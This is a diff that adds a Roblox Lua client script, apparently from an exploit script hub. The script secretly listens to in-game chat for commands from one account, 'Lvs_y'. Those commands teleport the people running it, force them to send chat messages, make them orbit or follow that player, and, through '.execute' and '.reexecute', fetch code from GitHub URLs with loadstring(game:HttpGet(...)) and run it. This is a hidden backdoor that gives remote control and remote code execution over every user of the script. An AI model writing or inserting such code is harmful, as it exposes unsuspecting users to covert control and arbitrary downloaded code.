@@ -1,0 +1,84 @@
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(H)
+    if H.FromSpeaker == "Lvs_y" and H.Message == ".rejoin" then
+        if game.Players.LocalPlayer.Character.Name == "Lvs_y" then
+            return
+        end
+        local placeId = game.PlaceId
+        local jobId = game.JobId
+        game:GetService("TeleportService"):TeleportToPlaceInstance(placeId, jobId, player)
+    elseif H.FromSpeaker == "Lvs_y" and H.Message == ".reset" then
+        if game.Players.LocalPlayer.Character.Name == "Lvs_y" then
+            return
+        end
+        local P = game:GetService("Players").LocalPlayer
+        if game.PlaceId == 6708206173 then
+            Position = P.Character.HumanoidRootPart.CFrame
+            task.wait(game:GetService("ReplicatedStorage"):WaitForChild("RequestRespawn"):FireServer())
+            P.CharacterAdded:Wait()
+            P.Character:WaitForChild("HumanoidRootPart").CFrame = Position
+        end
+    elseif H.FromSpeaker == "Lvs_y" and H.Message:sub(1, 4) == ".say" then
+        local message = H.Message:sub(6)
+        if game.Players.LocalPlayer.Character.Name == "Lvs_y" then
+            return
+        end
+        game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(message, "All")
+    elseif H.FromSpeaker == "Lvs_y" and H.Message:sub(1, 7) == ".notify" then
+        local message = H.Message:sub(9)
+        local notiuser = game:GetService("Players").LocalPlayer
+        local notigui = notiuser.PlayerGui.MainGui.NotificationFrame
+        notigui.NotificationText.Text = message
+        notigui.Visible = true
+        wait(5)
+        notigui.Visible = false
+    elseif H.FromSpeaker == "Lvs_y" and H.Message == ".come" then
+        local userrr = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart
+        local hotrobloxfemboydev = game.Workspace.Lvs_y.HumanoidRootPart
+        userrr.CFrame = hotrobloxfemboydev.CFrame
+    elseif H.FromSpeaker == "Lvs_y" and H.Message == ".vc" then
+        if game.Players.LocalPlayer.Name == "Ifknloveyo" then
+            while wait(0.05) do
+                local vcacc = game.Players.LocalPlayer.Character.HumanoidRootPart
+                local hotrobloxfemboydev2 = game.Workspace.Lvs_y.HumanoidRootPart
+                game.Workspace.Gravity = 0
+                vcacc.CFrame = hotrobloxfemboydev2.CFrame + Vector3.new(0, -14, 0)
+            end
+        end
+    elseif H.FromSpeaker == "Lvs_y" and H.Message == ".unorbit" then
+        if game.Players.LocalPlayer.Character.Name == "Lvs_y" then
+            return
+        end
+        _G.orbitMe = false
+        game:GetService("Players").LocalPlayer.Character.Animate.Disabled = false
+    elseif H.FromSpeaker == "Lvs_y" and H.Message == ".orbit" then
+        if game.Players.LocalPlayer.Character.Name == "Lvs_y" then
+            return
+        end
+        _G.orbitMe = true
+        local center
+        local radius = 7
+        local speed = 12.5
+        local angle = 10
+        game:GetService("Players").LocalPlayer.Character.Animate.Disabled = true
+        while _G.orbitMe == true and wait() do
+            angle = angle + speed
+            if angle >= 360 then angle = 0 end
+            local radians = math.rad(angle)
+            local offset = Vector3.new(radius * math.cos(radians), 0, radius * math.sin(radians))
+            local center = game:GetService("Workspace").Lvs_y.HumanoidRootPart.Position
+            local position = center + offset
+            local direction = (center - position).Unit
+            game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(position, position + direction)
+        end
+    elseif H.FromSpeaker == "Lvs_y" and H.Message == ".execute" then
+        if game.Players.LocalPlayer.Character.Name == "Lvs_y" then
+            return
+        end
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Lvsyyy/Fun/main/Execute%20Test"))()
+    elseif H.FromSpeaker == "Lvs_y" and H.Message == ".reexecute" then
+        if game.Players.LocalPlayer.Character.Name == "Lvs_y" then
+            return
+        end
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Lvsyyy/UI/main/Vyxen%20no%20cmds"))()
+    end
+end)
